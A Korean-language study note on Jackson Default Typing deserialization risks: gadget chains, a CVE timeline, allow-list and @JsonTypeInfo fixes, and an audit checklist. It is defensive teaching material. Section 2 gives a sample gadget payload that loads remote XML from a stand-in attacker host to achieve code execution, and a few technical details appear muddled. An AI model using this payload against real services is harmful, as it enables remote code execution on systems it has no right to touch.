---
parent: 17-spring-web
seq: 12
title: Default Typing 의 위험 (CVE 시리즈 + Gadget Chain)
type: deep
created: 2026-05-01
---

# 12. Default Typing 의 위험

> 면접 보안 단골: **"Jackson Default Typing 이 왜 위험한가요?"**
>
> Java 진영의 가장 유명한 RCE 패턴 중 하나. 2017년 CVE-2017-7525 이래로 수십 개의 CVE 가 같은 패턴으로 누적됐다.

## 1. Default Typing 이 무엇인가

`enableDefaultTyping()` (Jackson 2.x) / `activateDefaultTyping()` 은 **JSON 안에 클래스 이름(FQCN)을 함께 직렬화** 하고 역직렬화 시 그 이름의 클래스를 인스턴스화하는 기능.

```kotlin
val mapper = ObjectMapper()
mapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance)  // ❌ 위험

val event: Any = OrderPlaced(1L, BigDecimal("100"))
val json = mapper.writeValueAsString(event)
// 결과: ["com.kgd.order.OrderPlaced", { "orderId":1, "total":"100" }]
//      └────────────── FQCN ──────────────┘
```

직렬화 시 FQCN 을 함께 보내고, 역직렬화 시 그 FQCN 을 `Class.forName(name).newInstance()` 호출 → **공격자가 임의 클래스를 인스턴스화** 시킬 수 있음.

## 2. 공격 시나리오 — Gadget Chain

### 핵심 아이디어

- JVM 클래스패스에 "이 클래스의 setter/생성자가 호출되면 시스템 명령을 실행하는" 클래스가 있으면
- 공격자가 그 클래스 FQCN 을 JSON 에 넣어 보냄
- Jackson 이 그 클래스를 인스턴스화 + setter 호출 → 명령 실행

### 유명한 gadget 들

| 클래스 | 효과 |
|---|---|
| `org.springframework.context.support.ClassPathXmlApplicationContext` | 임의 XML URL 로드 → Bean 정의 → 임의 코드 실행 |
| `com.sun.rowset.JdbcRowSetImpl` | JNDI lookup → LDAP/RMI 서버에서 클래스 로딩 |
| `org.apache.commons.collections.functors.InvokerTransformer` | reflection 으로 임의 메소드 호출 (Apache Commons Collections gadget) |
| `org.springframework.beans.factory.config.PropertyPathFactoryBean` | property path 로 호출 chain 트리거 |
| `ch.qos.logback.core.db.DriverManagerConnectionSource` | JDBC 드라이버 로딩 → 악성 DB 서버 연결 |

### 공격 페이로드 예시

```json
[
  "org.springframework.context.support.ClassPathXmlApplicationContext",
  "http://attacker.com/evil.xml"
]
```

→ Jackson 이 `ClassPathXmlApplicationContext("http://attacker.com/evil.xml")` 호출 → Spring 이 XML 다운로드 → `<bean>` 정의 안의 `init-method` 가 임의 명령 실행.

## 3. CVE 연대기 (요약)

| CVE | 영향 | gadget |
|---|---|---|
| CVE-2017-7525 | 첫 보고 | Spring `ClassPathXmlApplicationContext` 등 |
| CVE-2017-15095 | 2차 | logback `JdbcRowSetImpl` 등 |
| CVE-2017-17485 | 3차 | Spring `ConfigurableApplicationContext` |
| CVE-2018-7489 | 4차 | c3p0 PoolBackedDataSource |
| CVE-2019-12384 | 5차 | h2 driver |
| ... | (계속) | (블랙리스트로는 끝나지 않는 패턴) |

→ Jackson 측 대응: 새 gadget 발견될 때마다 deny-list 갱신 → 무의미. **가능한 모든 클래스가 잠재적 gadget.**

## 4. 안전한 접근 — `PolymorphicTypeValidator`

Jackson 2.10+ 부터 **allow-list 강제**:

```kotlin
val validator = BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType(Event::class.java)            // Event 의 서브타입만 허용
    .allowIfSubType("com.kgd.order.event.")         // 패키지 prefix
    .build()

mapper.activateDefaultTyping(
    validator,
    ObjectMapper.DefaultTyping.NON_FINAL,
    JsonTypeInfo.As.PROPERTY
)
```

→ 그래도 굳이 Default Typing 을 쓸 이유는 없다. **`@JsonTypeInfo` + `@JsonSubTypes`** 가 더 명시적이고 안전.

## 5. 안전 패턴 정리

### ❌ 절대 하지 말 것

```kotlin
// 1. activateDefaultTyping 무인자
mapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance)

// 2. enableDefaultTyping (deprecated 된 옛 API)
mapper.enableDefaultTyping()

// 3. @JsonTypeInfo(use = Id.CLASS)
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
sealed class Event { ... }

// 4. 외부 신뢰 안 되는 JSON 을 mapper.readValue(json, Object.class) — Object 타깃은 위험
val any: Any = mapper.readValue(untrustedJson, Any::class.java)
```

### ✅ 정공

```kotlin
// 1. 명시적 polymorphism
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes(
    JsonSubTypes.Type(value = OrderPlacedEvent::class, name = "ORDER_PLACED"),
    JsonSubTypes.Type(value = OrderCancelledEvent::class, name = "ORDER_CANCELLED")
)
sealed class OrderEvent

// 2. 타깃 클래스 명시
val event: OrderEvent = mapper.readValue(json, OrderEvent::class.java)

// 3. 알 수 없는 필드 무시 (DoS 방지)
mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
```

## 6. 인접 위험들

### 6.1. `@JsonCreator` 의 부작용

생성자에서 reflection 호출이나 외부 IO 가 일어나면 역직렬화만으로 부작용 발생. 도메인 객체 생성은 가능한 한 단순하게.

### 6.2. JsonFilter 우회

`@JsonFilter` 는 직렬화 시점 필드 마스킹 — 입력 검증과는 다름. 입력 받을 땐 별도 검증.

### 6.3. XML / YAML mapper 도 동일

Jackson 의 XML 모듈, YAML 모듈도 같은 default typing 위험. SnakeYAML 의 별도 CVE 는 더 광범위.

```kotlin
// SnakeYAML 직접 쓰면
Yaml().load<Any>(untrustedYaml)  // ❌ !!java.util.Date 같은 tag 로 임의 클래스 인스턴스화
```

→ YAML 입력 시 `SafeConstructor` 또는 Jackson YAML 모듈 + 명시 타깃 사용.

### 6.4. JSON Bomb (DoS)

```json
{"a":{"a":{"a":{"a":{"a":{ ... 수만 단계 nested ... }}}}}}
```

→ 파서가 재귀 호출하다 StackOverflow 또는 OOM. Jackson 은 기본 `MAX_DEPTH` 제한이 없어서 명시 필요.

```kotlin
mapper.factory.streamReadConstraints = StreamReadConstraints.builder()
    .maxNestingDepth(100)
    .maxStringLength(10_000_000)
    .maxNumberLength(1000)
    .build()
```

Jackson 2.16+ 부터 기본값으로 1000 depth 제한이 있음.

## 7. msa 점검 체크리스트

```bash
# 1. activateDefaultTyping / enableDefaultTyping 사용 확인 (없어야 함)
grep -r "activateDefaultTyping\|enableDefaultTyping" --include="*.kt" .

# 2. @JsonTypeInfo(use = ... CLASS) 사용 확인 (Id.NAME 만 허용)
grep -r "JsonTypeInfo.Id.CLASS\|JsonTypeInfo.Id.MINIMAL_CLASS" --include="*.kt" .

# 3. readValue(json, Any::class) 또는 readValue(json, Object::class) 사용 확인
grep -r "readValue.*Any::class\|readValue.*Object::class" --include="*.kt" .

# 4. Kafka payload 가 envelope/sealed-class 인지 확인
```

→ msa 의 현재 코드에 default typing 사용 없음 (확인됨). 다만 Kafka consumer 들이 polymorphic deserialization 을 어떻게 하는지 [11](11-jackson-serializer.md) 의 envelope/sealed-class 패턴으로 표준화 필요 ([19](19-improvements.md)).

## 8. 면접 답변

### Q1. Jackson Default Typing 이 왜 위험한가요?

> "JSON 안에 클래스 FQCN 이 함께 직렬화되고, 역직렬화 시 그 클래스를 인스턴스화합니다. 공격자가 클래스패스에 있는 'gadget' 클래스 FQCN 을 보내면 Spring 의 `ClassPathXmlApplicationContext`, JdbcRowSetImpl, Apache Commons Collections 같은 부수효과 있는 클래스가 인스턴스화되며 RCE 가 발생합니다. CVE-2017-7525 이래로 새 gadget 이 계속 발견되어 deny-list 로는 막을 수 없고, 정공은 `activateDefaultTyping` 자체를 쓰지 않거나 Jackson 2.10+ 의 `BasicPolymorphicTypeValidator` 로 allow-list 를 강제하는 겁니다."

### Q2. 그럼 polymorphic 이 필요할 땐?

> "`@JsonTypeInfo(use = Id.NAME)` + `@JsonSubTypes` 로 논리 이름과 허용 클래스를 명시합니다. `Id.CLASS`/`Id.MINIMAL_CLASS` 도 같은 위험을 가지니 절대 쓰지 않습니다. Kafka 이벤트는 envelope + JsonNode payload 로 동적 처리하거나 sealed class polymorphic 으로 strict 처리하는 두 패턴을 trade-off 에 따라 선택합니다."

### Q3. 신뢰 안 되는 JSON 을 받아서 일단 파싱만 하고 싶을 때는?

> "`mapper.readTree(json)` 으로 `JsonNode` 까지만 읽고 그 안에서 필요한 필드만 명시적으로 꺼냅니다. `readValue(json, Any::class)` 는 Default Typing 안 켰어도 polymorphic 비활성 상태에선 안전하지만, `Object` 타깃은 의도적으로 피하는 게 운영상 명확합니다."

## 다음 학습

- [13-jackson-naming-perf.md](13-jackson-naming-perf.md) — snake_case 와 성능
- [19-improvements.md](19-improvements.md) — msa 의 default typing 점검 체크리스트
